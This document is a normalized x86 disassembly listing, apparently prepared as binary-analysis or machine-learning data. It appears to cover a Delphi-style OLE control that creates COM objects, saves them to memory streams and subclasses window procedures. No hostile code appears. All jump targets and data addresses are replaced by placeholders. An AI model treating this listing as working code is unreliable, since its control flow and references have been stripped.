inc ebx
xor edi edi
mov eax [ esi ]
mov edx edi
call sub_41a19c
call sub_40321c
inc edi
dec ebx
jne r-xdata
sub_4659d8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466e84
cmp [ esi + 0x218 ] 0x0
je r-xdata
mov eax esi
call sub_4661f8
mov eax esi
call sub_4662a0
lea eax [ esi + 0x21c ]
call sub_40599c
cmp [ esi + 0x218 ] 0x0
je r-xdata
push 0x1
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ esi + 0x218 ]
call sub_40599c
mov eax [ esi + 0x210 ]
call sub_40321c
lea eax [ esi + 0x240 ]
call sub_4659a0
lea eax [ esi + 0x244 ]
call sub_4659a0
mov eax [ esi + 0x208 ]
dec [ eax + 0x48 ]
mov eax [ esi + 0x208 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
push 0x0
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_442edc
test bl bl
jle r-xdata
mov eax esi
call sub_466260
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_465a98
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465d38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465d3f
lea eax [ ebp - 0xc ]
call sub_40599c
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
xor eax eax
push ebp
push j_sub_4036bc#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4036bc#9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_40599c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_461ccc
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x214 ]
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_40599c
push eax
push 0x0
push ebx
call CreateStreamOnHGlobal
call sub_461ccc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_461ccc
mov eax [ ebp - 0x4 ]
call sub_4662a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_461ccc
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_461ed8
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
sub ecx 0xfffffdb4
mov eax [ ebp - 0x4 ]
add eax 0x220
call sub_40599c
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_461ccc
mov eax [ ebp - 0x4 ]
add eax 0x224
call sub_40599c
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_461ccc
mov eax [ ebp - 0x4 ]
add eax 0x228
call sub_40599c
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
mov eax [ ebp - 0x4 ]
add eax 0x234
push eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_461ed8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
sub ecx 0xfffffff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
push 0xfffffe0b
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
push 0xfffffdfe
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
push 0xfffffe00
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
call sub_46781c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0xfffffdff
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
sub_465d88
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
mov ebx edx
cmp eax 0x80040112
jne r-xdata
call sub_461ccc
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40316c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
sub_465de0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465efa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
push ebp
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_40599c
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoCreateInstance
pop edx
call sub_465d88
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_40599c
push eax
push r-xdata
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoGetClassObject
call sub_461ccc
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x208 ]
mov edx [ edx + 0x28 ]
call sub_404788
push ebp
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_40599c
push eax
mov eax [ ebp - 0xc ]
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
pop edx
call sub_465d88
pop ecx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465f01
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0xc ]
call sub_404678
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
sub_465f28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465fea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4662a0
push 0x0
push 0x2
call GlobalAlloc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push j_sub_4036bc#7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_40599c
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CreateStreamOnHGlobal
call sub_461ccc
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_461ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40b8b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ff1
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
sub_465ff8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_465a98
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_444044
mov edx esp
mov eax ebx
call sub_440244
push esp
mov eax ebx
call sub_446ec0
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
push 0x0
push 0xfffffffb
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
sub eax 0xfffffd9c
mov eax ebx
call sub_466508
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_4470c4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax ebx
call sub_4470c4
push eax
call ShowWindow
jmp r-xdata
sub_46609c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edx edx
push ebp
push j_sub_4036bc#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_444c04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ esi ]
cmp eax 0xbc00
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test [ ebx + 0x23e ] 0x1
jne r-xdata
cmp eax 0xc000
jae r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4470c4
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub [ esi ] 0x9c00
sub_46612c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
pop esi
pop ebx
retn
sub_466154
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4037e8#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4443cc
mov eax [ ebp - 0x4 ]
push eax
push sub_466918
mov eax [ ebp - 0x4 ]
push eax
push sub_467214
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
setne cl
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4661f8
push ebx
mov ebx eax
lea ecx [ ebx + 0x238 ]
mov eax [ ebx + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x218 ]
call sub_461f84
lea ecx [ ebx + 0x234 ]
mov edx r-xdata
mov eax [ ebx + 0x218 ]
call sub_461f84
lea eax [ ebx + 0x228 ]
call sub_40599c
lea eax [ ebx + 0x224 ]
call sub_40599c
lea eax [ ebx + 0x220 ]
call sub_40599c
pop ebx
retn
sub_466260
push ebx
push esi
push edi
mov ebx [ eax + 0x208 ]
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x4c ]
call sub_40321c
xor eax eax
mov [ ebx + 0x4c ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x4c ]
call sub_41a19c
call sub_40321c
inc edi
dec esi
jne r-xdata
sub_4662c0
push ebx
mov ebx eax
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_444480
pop ebx
retn
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
cmp [ ebx + 0x218 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x180 ] eax
pop ebx
retn
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_46630c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov ecx [ ebx + 0x208 ]
mov edi [ ecx + 0x20 ]
mov esi [ ecx + 0x24 ]
xor eax eax
jmp r-xdata
cmp eax edi
jne r-xdata
cmp edx [ esi + eax * 4 ]
je r-xdata
xor eax eax
xor edx edx
jmp r-xdata
push eax
cmp [ ecx + 0x30 ] 0x191
jb r-xdata
inc eax
pop ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
call sub_4031a8
call sub_4031e4
add eax 0x7
and eax 0xfffffff8
mov eax [ ecx + 0x50 ]
test eax eax
jne r-xdata
add ebx eax
pop eax
mov edx [ ebx + eax * 8 + 0x4 ]
mov eax [ ebx + eax * 8 ]
sub_466380
push ebx
push esi
xor esi esi
call sub_4576d8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov edx [ rw-data ]
mov esi [ eax + 0x248 ]
mov esi [ ebx + 0x248 ]
jmp r-xdata
sub_4663e4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_40f174
mov ecx esi
mov edx edi
mov eax ebx
call sub_466404
pop edi
pop esi
pop ebx
retn
sub_466404
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_404904
xor eax eax
push ebp
push sub_466486
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_465a98
mov [ esi ] 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push esi
push rw-data
push 0x2
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46648d
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_4049d4
retn
lea edx [ ebp - 0x20 ]
call sub_462818
sub_466494
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4664e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_4664f0
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_412704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4664e9
lea eax [ ebp - 0x10 ]
call sub_40f188
retn
sub_4664f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4663e4
pop edi
pop esi
pop ebx
retn
sub_466508
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
xor eax eax
mov [ esp ] eax
push esp
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
cmp [ esp ] 0x0
jne r-xdata
mov esi [ esp ]
mov [ ebx + 0x180 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov [ ebx + 0x174 ] eax
mov eax [ rw-data ]
mov [ eax ] ebx
push sub_43d698
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SendMessageA
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
sub_466598
push ebx
push esi
push ebp
mov ebp esp
mov ebx eax
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
mov esp ebp
pop ebp
pop esi
pop ebx
retn
xor eax eax
lea esi [ ebx + 0x10 ]
push [ esi + 0x8 ]
je r-xdata
mov al [ esi ]
cmp al 0x1
ja r-xdata
push [ esi + 0x4 ]
test ah ah
jne r-xdata
mov ecx [ esi + 0x4 ]
mov ah 0x1
jmp r-xdata
add esi 0xc
dec edx
jne r-xdata
sub_4665d8
push ebp
mov ebp esp
add esp 0xfffffd64
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x29c ]
mov eax [ ebp - 0x4 ]
call sub_46630c
cmp [ ebp - 0x29c ] 0x10000
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push j_sub_4036bc#5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x294 ] eax
mov eax edx
mov [ ebp - 0x290 ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x29c ]
call sub_466598
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
add eax eax
mov edx [ ebx ]
lea eax [ edx + eax * 8 ]
mov ebx eax
lea esi [ ebp - 0x28c ]
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x10c ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx eax
sub edx 0x4
je r-xdata
mov [ esi ] 0x0
mov edx [ ebp - 0xc ]
lea edi [ ebp + edx * 8 - 0x10c ]
xor edx edx
mov [ edi ] edx
test ah 0x40
je r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi ]
call sub_404d94
mov edx [ esi + 0x4 ]
mov [ edx ] eax
mov [ esi ] 0x1
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec edx
sub edx 0x3
jb r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_404d70
xor eax eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov edx edi
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_404d70
mov eax [ ebx + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ esi + 0x4 ] edi
jmp r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x10c ]
call sub_403f6c
test ebx ebx
jne r-xdata
add esi 0xc
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x290 ]
jne r-xdata
mov [ esi ] 0x2
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec edx
je r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
sub ebx 0x10
mov eax [ ebx ]
and eax 0xffff
mov edx eax
and edx 0xfff
cmp edx 0x8
jne r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] ebx
jmp r-xdata
jmp r-xdata
mov [ esi ] 0x0
test ah 0x20
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] ebx
jmp r-xdata
sub_466778
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x30 ] 0x12c
jge r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_46630c
cmp [ ebp - 0x10 ] 0x10000
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4665d8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push j_sub_4036bc#4
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
push esi
mov esi [ ebp - 0x4 ]
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
pop esi
pop ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov esi [ esi ]
mov eax ebx
shl eax 0x4
xor edx edx
add esi eax
cmp ax 0x7
ja r-xdata
je r-xdata
test dl dl
jne r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
test eax 0x2000
je r-xdata
mov ecx esi
inc dl
test eax 0x2000
jne r-xdata
sub esi 0x10
mov eax [ esi ]
cmp ax 0x4
ja r-xdata
push esi
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
jmp r-xdata
sub_46685c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
mov eax esi
call sub_4473c8
and al [ esp ]
je r-xdata
test bl bl
jne r-xdata
push 0x0
push 0x0
push 0x30f
mov eax esi
call sub_4470c4
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
test eax eax
setne bl
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov dl [ esp ]
mov eax esi
call sub_446354
mov ebx eax
sub_4668ac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov ebx [ esi + 0x244 ]
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov ebx eax
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax ebp
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0x244 ]
call sub_41a19c
cmp ebp eax
jne r-xdata
mov edx [ esi + 0x208 ]
mov edx [ edx + 0x40 ]
mov edx [ edx + edi * 4 ]
mov ecx eax
mov eax esi
call sub_466c7c
jmp r-xdata
sub_466918
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4662a0
xor eax eax
push ebp
push j_sub_4036bc#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
push 0x2
call GlobalAlloc
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] esi
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_4669a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4669b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
call sub_40b8b8
sub_4669d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebx + 0x48 ]
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
test eax eax
jg r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_446a78
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test edx edx
jle r-xdata
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov esi [ ebx + 0x48 ]
mov eax [ ebx + 0x4c ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
mov eax [ ebp + 0x8 ]
push eax
call MulDiv
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
push esi
call MulDiv
lea ecx [ ebp - 0x10 ]
pop edx
call sub_418d40
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
test eax eax
je r-xdata
sub_466ab4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466b5a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_404004
mov edx esi
mov eax ebx
call sub_44068c
cmp [ ebx + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466b61
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
push 0xfffffd42
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x2c ]
test al 0x30
je r-xdata
test al 0x10
je r-xdata
mov edi 0xfffffdfb
mov edi 0xfffffdfa
jmp r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_466e24
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_466494
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404378
jne r-xdata
sub_466b9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466c6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440778
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c73
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
xor eax eax
push ebp
push j_sub_4036bc#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_40599c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_461ccc
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_466c06
or ebx 0xffffffff
call sub_403a24
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_461ccc
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c73
